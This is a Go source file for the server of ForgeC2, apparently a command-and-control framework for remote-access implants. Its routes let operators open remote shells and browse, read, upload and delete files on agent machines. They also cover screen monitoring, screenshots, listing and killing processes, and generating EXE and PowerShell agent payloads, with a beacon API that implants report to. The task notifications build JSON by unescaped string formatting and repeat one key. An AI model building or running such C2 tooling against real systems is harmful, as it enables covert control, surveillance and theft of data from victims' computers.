package server

import (
	"crypto/tls"
	"embed"
	"fmt"
	"html/template"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/config"
	"github.com/forgec2/forgec2/internal/crypto"
	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/server/middleware"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"gorm.io/gorm"
)

//go:embed templates/*
var templateFS embed.FS

type Server struct {
	cfg          *config.Config
	db           *gorm.DB
	router       *gin.Engine
	tmpl         *template.Template
	wsClients    map[*websocket.Conn]bool
	wsMutex      sync.Mutex
	wsUpgrader   websocket.Upgrader
	rateLimiter  *middleware.RateLimiter
	loginLimiter *middleware.RateLimiter
}

func New(cfg *config.Config, database *gorm.DB) *Server {
	gin.SetMode(gin.ReleaseMode)

	middleware.InitJWTSecret(cfg)

	r := gin.New()
	r.Use(gin.Recovery())
	r.Use(middleware.SecurityHeaders())
	r.Use(middleware.NoCache())
	r.Use(middleware.ErrorHandler())

	s := &Server{
		cfg:          cfg,
		db:           database,
		router:       r,
		wsClients:    make(map[*websocket.Conn]bool),
		rateLimiter:  middleware.NewRateLimiter(BeaconRateLimit, BeaconRateWindow),
		loginLimiter: middleware.NewRateLimiter(LoginRateLimit, LoginRateWindow),
		wsUpgrader: websocket.Upgrader{
			ReadBufferSize:  1024,
			WriteBufferSize: 1024,
			CheckOrigin: func(r *http.Request) bool {
				origin := r.Header.Get("Origin")
				if origin == "" {
					return true
				}
				u, err := url.Parse(origin)
				if err != nil {
					return false
				}
				return u.Host == r.Host
			},
		},
	}

	s.setupTemplates()
	s.setupRoutes()

	return s
}

func (s *Server) setupTemplates() {
	funcMap := template.FuncMap{
		"formatTime": func(t time.Time) string {
			return t.Format("2006-01-02 15:04:05")
		},
		"statusClass": func(status string) string {
			if status == "online" {
				return "bg-green-500"
			}
			return "bg-red-500"
		},
		"upper": strings.ToUpper,
	}

	tmpl, err := template.New("").Funcs(funcMap).ParseFS(templateFS, "templates/*.html")
	if err != nil {
		slog.Error("Failed to parse templates", "err", err)
		panic(err)
	}
	s.tmpl = tmpl
}

func (s *Server) setupRoutes() {
	// Request logging middleware
	s.router.Use(middleware.RequestLogger())

	// Auth with CSRF and login rate limiting
	s.router.GET("/login", middleware.CSRFProtection(), s.handleLoginPage)
	s.router.POST("/login", s.loginLimiter.Limit(), middleware.CSRFProtection(), s.handleLogin)
	s.router.GET("/logout", s.handleLogout)

	// Protected routes with CSRF
	auth := s.router.Group("/")
	auth.Use(middleware.AuthRequired(s.cfg))
	auth.Use(s.AuditMiddleware())
	auth.Use(middleware.CSRFProtection())
	{
		auth.GET("/", s.handleDashboard)
		auth.GET("/dashboard", s.handleDashboard)
		auth.GET("/agents", s.handleAgents)
		auth.GET("/agents/:id", s.handleAgentDetail)
		auth.GET("/agents/:id/shell", s.handleShellPage)
		auth.GET("/agents/:id/files", s.handleFileBrowserPage)
		auth.GET("/agents/:id/screen", s.handleScreenMonitorPage)
		auth.GET("/agents/:id/tasks", s.handleGetAgentTasks)
		auth.GET("/agents/:id/tasks/:taskId", s.handleGetTaskStatus)
		auth.POST("/agents/:id/kill", s.handleKillAgent)
		auth.POST("/agents/:id/command", s.handleSendCommand)
		auth.POST("/agents/:id/screenshot", s.handleRequestScreenshot)
		auth.POST("/agents/:id/ps", s.handleRequestPS)
		auth.POST("/agents/:id/download", s.handleDownload)
		auth.POST("/agents/:id/upload", s.handleUploadFile)
		auth.POST("/agents/:id/note", s.handleUpdateNote)
		auth.DELETE("/agents/:id", s.handleDeleteAgent)
		auth.POST("/agents/batch", s.handleBatchCommand)
		auth.POST("/agents/:id/files/ls", s.handleListDir)
		auth.POST("/agents/:id/files/delete", s.handleFileDelete)
		auth.POST("/agents/:id/files/read", s.handleFileRead)
		auth.POST("/agents/:id/files/upload", s.handleFileUploadFromAgent)
		auth.POST("/agents/:id/screen/start", s.handleStartScreenMonitor)
		auth.POST("/agents/:id/screen/stop", s.handleStopScreenMonitor)
		auth.GET("/generate", s.handleGeneratePage)
		auth.POST("/generate/exe", s.handleGenerateEXE)
		auth.POST("/generate/ps1", s.handleGeneratePS1)
		auth.GET("/tasks", s.handleTaskHistory)
		auth.GET("/audit", s.handleAuditLogPage)
		auth.GET("/audit/logs", s.handleGetAuditLogs)
		auth.GET("/settings", s.handleSettingsPage)
		auth.POST("/settings/password", s.handleChangePassword)
		auth.POST("/settings/agent", s.handleSaveAgentConfig)
		auth.GET("/ws", s.handleWebSocket)
	}

	// Agent Beacon API with rate limiting
	api := s.router.Group("/api/v1")
	api.Use(s.rateLimiter.Limit())
	{
		api.POST("/beacon", s.handleBeacon)
	api.POST("/screen_frame", s.handleScreenFrame)
	}

	// Screenshot serving (protected)
	s.router.GET("/screenshots/:agent_id/:filename", middleware.AuthRequired(s.cfg), s.handleServeScreenshot)
}

// handleWebSocket handles WebSocket connections for real-time notifications
func (s *Server) handleWebSocket(c *gin.Context) {
	conn, err := s.wsUpgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.Error("Failed to upgrade WebSocket", "err", err)
		return
	}

	s.wsMutex.Lock()
	s.wsClients[conn] = true
	s.wsMutex.Unlock()

	slog.Info("WebSocket client connected")

	go func() {
		defer func() {
			s.wsMutex.Lock()
			delete(s.wsClients, conn)
			s.wsMutex.Unlock()
			conn.Close()
			slog.Info("WebSocket client disconnected")
		}()

		for {
			_, _, err := conn.ReadMessage()
			if err != nil {
				break
			}
		}
	}()
}

// broadcastAgentNotification sends a notification to all WebSocket clients
func (s *Server) broadcastAgentNotification(agent db.Agent) {
	notification := fmt.Sprintf(`{"type":"agent_online","agent_id":"%s","hostname":"%s","username":"%s","ip":"%s"}`,
		agent.ID, agent.Hostname, agent.Username, agent.IP)

	s.wsMutex.Lock()
	defer s.wsMutex.Unlock()

	for conn := range s.wsClients {
		err := conn.WriteMessage(websocket.TextMessage, []byte(notification))
		if err != nil {
			slog.Error("Failed to send WebSocket message", "err", err)
			conn.Close()
			delete(s.wsClients, conn)
		}
	}
}

// broadcastTaskUpdate pushes task status (and result if completed) to WS clients
func (s *Server) broadcastTaskUpdate(agentID string, task db.Task) {
	notification := fmt.Sprintf(`{"type":"task_update","agent_id":"%s","task_id":%d,"type":"%s","status":"%s","command":"%s"`,
		agentID, task.ID, task.Type, task.Status, task.Command)
	if task.Result != "" {
		notification += fmt.Sprintf(`,"result":"%s"`, truncateString(task.Result, 200))
	}
	if task.Error != "" {
		notification += fmt.Sprintf(`,"error":"%s"`, task.Error)
	}
	notification += "}"

	s.wsMutex.Lock()
	defer s.wsMutex.Unlock()

	for conn := range s.wsClients {
		err := conn.WriteMessage(websocket.TextMessage, []byte(notification))
		if err != nil {
			slog.Error("Failed to send WS task update", "err", err)
			conn.Close()
			delete(s.wsClients, conn)
		}
	}
}

func truncateString(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

// cleanupOldData removes old completed/failed tasks and old screenshots to prevent DB bloat
func (s *Server) cleanupOldData() {
	cutoff := time.Now().Add(-30 * 24 * time.Hour) // 30 days

	// delete old tasks
	if err := s.db.Where("created_at < ? AND status IN ?", cutoff, []string{"completed", "failed"}).Delete(&db.Task{}).Error; err != nil {
		slog.Error("cleanup tasks failed", "err", err)
	}

	// optional: clean old screenshot files (simple age based would require walking dirs, skipped for simplicity)
	// for production add os.Remove for files older than cutoff in data/screenshots/*

	slog.Info("old data cleanup completed")
}

func (s *Server) Run() error {
	certPath := s.cfg.Server.CertFile
	keyPath := s.cfg.Server.KeyFile

	if s.cfg.Server.TLSEnabled {
		if err := crypto.GenerateSelfSignedCert(certPath, keyPath); err != nil {
			slog.Error("Failed to generate self-signed cert", "err", err)
			return err
		}
		slog.Info("TLS certificate ready", "cert", certPath)
	}

	// start periodic cleanup
	go s.runPeriodicCleanup()

	addr := s.cfg.Server.Host + ":" + itoa(s.cfg.Server.Port)
	slog.Info("Starting ForgeC2 server", "addr", addr, "tls", s.cfg.Server.TLSEnabled)

	if s.cfg.Server.TLSEnabled {
		tlsCfg := &tls.Config{
			MinVersion: tls.VersionTLS12,
		}
		server := &http.Server{
			Addr:      addr,
			Handler:   s.router,
			TLSConfig: tlsCfg,
		}
		return server.ListenAndServeTLS(certPath, keyPath)
	}
	return s.router.Run(addr)
}

func (s *Server) runPeriodicCleanup() {
	s.cleanupOldData()
	ticker := time.NewTicker(24 * time.Hour)
	for range ticker.C {
		s.cleanupOldData()
	}
}

func itoa(i int) string {
	return fmt.Sprintf("%d", i)
}
